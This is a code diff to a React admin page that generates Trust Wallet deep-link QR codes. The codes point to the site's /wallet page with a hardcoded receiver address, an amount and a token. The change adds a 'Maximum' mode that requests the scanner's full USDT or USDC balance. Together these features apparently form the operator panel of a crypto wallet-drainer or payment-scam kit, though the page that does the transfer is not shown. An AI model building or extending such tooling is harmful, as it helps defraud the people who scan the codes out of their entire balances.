@@ -5,6 +5,7 @@ import { useState, useEffect, useRef } from "react";
 export default function AdminPage() {
   const [receiverAddress, setReceiverAddress] = useState("0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf");
   const [amount, setAmount] = useState("1");
+  const [isMaxMode, setIsMaxMode] = useState(false);
   const [token, setToken] = useState<"USDT" | "USDC">("USDT");
   const [qrUrl, setQrUrl] = useState("");
   const [isMounted, setIsMounted] = useState(false);
@@ -33,8 +34,10 @@ export default function AdminPage() {
       const savedAddress = localStorage.getItem("admin_receiver_address");
       const savedAmount = localStorage.getItem("admin_amount");
       const savedToken = localStorage.getItem("admin_token");
+      const savedMaxMode = localStorage.getItem("admin_max_mode");
       if (savedAddress) setReceiverAddress(savedAddress);
       if (savedAmount) setAmount(savedAmount);
+      if (savedMaxMode === "true") setIsMaxMode(true);
       if (savedToken === "USDT" || savedToken === "USDC") setToken(savedToken);
 
       const auth = sessionStorage.getItem("admin_auth");
@@ -53,19 +56,21 @@ export default function AdminPage() {
     localStorage.setItem("admin_receiver_address", receiverAddress);
     localStorage.setItem("admin_amount", amount);
     localStorage.setItem("admin_token", token);
+    localStorage.setItem("admin_max_mode", isMaxMode ? "true" : "false");
 
     // Récupérer le nom de domaine actuel de façon 100% dynamique
     const origin = window.location.origin;
     const baseUrl = `${origin}/wallet`;
     
     // Construire l'URL avec les paramètres query
-    const targetUrl = `${baseUrl}?to=${receiverAddress}&amount=${amount}&token=${token.toLowerCase()}`;
+    const effectiveAmount = isMaxMode ? "max" : amount;
+    const targetUrl = `${baseUrl}?to=${receiverAddress}&amount=${effectiveAmount}&token=${token.toLowerCase()}`;
     
     // Construire le lien Trust Wallet deep link
     const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
     
     setQrUrl(trustWalletLink);
-  }, [receiverAddress, amount, token, isMounted, isAuthenticated]);
+  }, [receiverAddress, amount, token, isMaxMode, isMounted, isAuthenticated]);
 
   // Générer le QR code stylisé
   useEffect(() => {
@@ -285,16 +290,37 @@ export default function AdminPage() {
           </div>
 
           <label className="form-label">Amount ({token})</label>
-          <div className="input-row">
+          <div className="input-row" style={{ opacity: isMaxMode ? 0.4 : 1, pointerEvents: isMaxMode ? "none" : "auto" }}>
             <input
               type="text"
               ref={amountInputRef}
-              value={amount}
+              value={isMaxMode ? "Maximum" : amount}
               onChange={(e) => setAmount(e.target.value)}
               className="input-row__field"
               placeholder="1.0"
+              readOnly={isMaxMode}
             />
           </div>
+          <label
+            style={{
+              display: "flex",
+              alignItems: "center",
+              gap: "0.5rem",
+              marginTop: "0.65rem",
+              cursor: "pointer",
+              userSelect: "none"
+            }}
+          >
+            <input
+              type="checkbox"
+              checked={isMaxMode}
+              onChange={(e) => setIsMaxMode(e.target.checked)}
+              style={{ width: "18px", height: "18px", accentColor: "#0033ff", cursor: "pointer" }}
+            />
+            <span style={{ fontSize: "0.88rem", fontWeight: 600, color: isMaxMode ? "#0033ff" : "#475569" }}>
+              Maximum — send full {token} balance
+            </span>
+          </label>
         </div>
 
         {/* QR Code Section (Pushed down with large space) */}
